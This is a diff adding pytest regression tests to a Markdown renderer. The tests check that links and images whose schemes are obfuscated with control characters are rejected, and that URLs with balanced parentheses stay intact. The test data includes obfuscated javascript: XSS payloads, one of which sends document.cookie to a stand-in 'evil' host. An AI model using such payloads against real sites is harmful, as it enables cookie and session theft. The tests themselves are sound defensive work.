@@ -83,6 +83,68 @@ def test_d7_javascript_alt_case_and_whitespace_rejected(tmp_path: Path) -> None:
     assert any(w.startswith("link_scheme_rejected:javascript") for w in doc.warnings)
 
 
+# --- D7 (Renata handback CRITICAL): control-character-obfuscated scheme rejected ---
+# The WHATWG URL parser strips ASCII tab/CR/LF from anywhere in a URL string
+# before determining the scheme, so real browsers treat e.g. "java<TAB>script:"
+# identically to "javascript:" and execute it. _SCHEME_RE must be evaluated
+# against the same control-stripped string a browser will actually parse.
+#
+# LF (\n) is deliberately excluded from this parametrization: the renderer's
+# top-level block parser (`_render_blocks`) splits ``source`` on "\n" before
+# any inline/URL processing runs, so a literal embedded LF can never survive
+# as a raw byte adjacent to the scheme letters -- it is always consumed as a
+# line break and rejoined as a plain space by paragraph continuation. A plain
+# U+0020 space (unlike tab/CR/LF) is *not* stripped by the WHATWG URL parser
+# either, so "javas cript:" is not a valid scheme to a real browser -- this
+# path is independently safe, just via block-level line-splitting rather
+# than the control-char strip added below. See
+# test_d7_embedded_linebreak_in_scheme_stays_inert for that path's coverage.
+
+
+@pytest.mark.parametrize("control", ["\t", "\r", "\x0b", "\x0c", "\x00"])
+@pytest.mark.parametrize("scheme", ["javascript", "data", "vbscript", "file"])
+def test_d7_control_char_obfuscated_link_scheme_rejected(tmp_path: Path, scheme: str, control: str) -> None:
+    # Insert the control character mid-scheme, e.g. "java<TAB>script:alert(1)".
+    split = max(1, len(scheme) // 2)
+    obfuscated_scheme = scheme[:split] + control + scheme[split:]
+    payload = f"{obfuscated_scheme}:alert(1)" if scheme == "javascript" else f"{obfuscated_scheme}:something"
+    doc = _render(f"[link]({payload})", tmp_path)
+    assert "href=" not in doc.html, doc.html
+    assert any(w.startswith(f"link_scheme_rejected:{scheme}") for w in doc.warnings), doc.warnings
+
+
+@pytest.mark.parametrize("control", ["\t", "\r", "\x0b", "\x0c", "\x00"])
+@pytest.mark.parametrize("scheme", ["javascript", "data", "vbscript", "file"])
+def test_d7_control_char_obfuscated_image_scheme_rejected(tmp_path: Path, scheme: str, control: str) -> None:
+    split = max(1, len(scheme) // 2)
+    obfuscated_scheme = scheme[:split] + control + scheme[split:]
+    payload = f"{obfuscated_scheme}:something"
+    doc = _render(f"![img]({payload})", tmp_path)
+    assert "src=" not in doc.html, doc.html
+    assert any(w.startswith(f"image_scheme_rejected:{scheme}") for w in doc.warnings), doc.warnings
+
+
+def test_d7_embedded_linebreak_in_scheme_stays_inert(tmp_path: Path) -> None:
+    # A literal LF inside "[link](java\nscript:alert(1))" is consumed by the
+    # block parser's paragraph-line-join before it ever reaches URL
+    # resolution, becoming "java script:alert(1)" -- a space-broken string
+    # that is not a valid scheme to a real browser either (only tab/CR/LF,
+    # not plain space, are stripped mid-string by the WHATWG URL parser).
+    # Assert the safety property that actually matters: no live/clickable
+    # javascript: URI is ever produced, regardless of which code path
+    # neutralized it.
+    doc = _render("[link](java\nscript:alert(1))", tmp_path)
+    assert 'href="javascript:' not in doc.html, doc.html
+
+
+def test_d7_control_char_obfuscated_link_no_closing_paren_rejected(tmp_path: Path) -> None:
+    # The exploit does not need a closing paren either -- verify the
+    # truncated-at-first-paren regex behavior does not accidentally save it.
+    doc = _render("[link](java\tscript:location='//evil/?c='+document.cookie)", tmp_path)
+    assert "href=" not in doc.html, doc.html
+    assert any(w.startswith("link_scheme_rejected:javascript") for w in doc.warnings), doc.warnings
+
+
 # --- D8: https accepted, case-insensitive/whitespace-tolerant ---------------------
 
 
@@ -227,6 +289,26 @@ def test_d13_block_and_inline_vocabulary(tmp_path: Path) -> None:
     ):
         assert tag in doc.html, f"missing {tag} in {doc.html}"
     assert 'class="language-python"' in doc.html
+
+
+# --- D13 (Renata handback MEDIUM): link/image targets with balanced parens --------
+# A literal ")" inside a link/image target (common in Wikipedia-style URLs and
+# code-search links) must not silently truncate the href/src at the first
+# close-paren -- the renderer's output must match what the author wrote.
+
+
+def test_d13_link_target_with_balanced_parens_not_truncated(tmp_path: Path) -> None:
+    doc = _render("[wiki](https://en.wikipedia.org/wiki/Example_(disambiguation))", tmp_path)
+    assert 'href="https://en.wikipedia.org/wiki/Example_(disambiguation)"' in doc.html, doc.html
+
+
+def test_d13_image_target_with_balanced_parens_not_truncated(tmp_path: Path) -> None:
+    asset_root = tmp_path / "assets"
+    asset_root.mkdir()
+    (asset_root / "diagram_(v2).png").write_bytes(b"png-bytes")
+
+    doc = _render("![x](diagram_(v2).png)", asset_root)
+    assert 'src="diagram_(v2).png"' in doc.html, doc.html
 
 
 # --- D14: GFM task-list checkbox ----------------------------------------------------
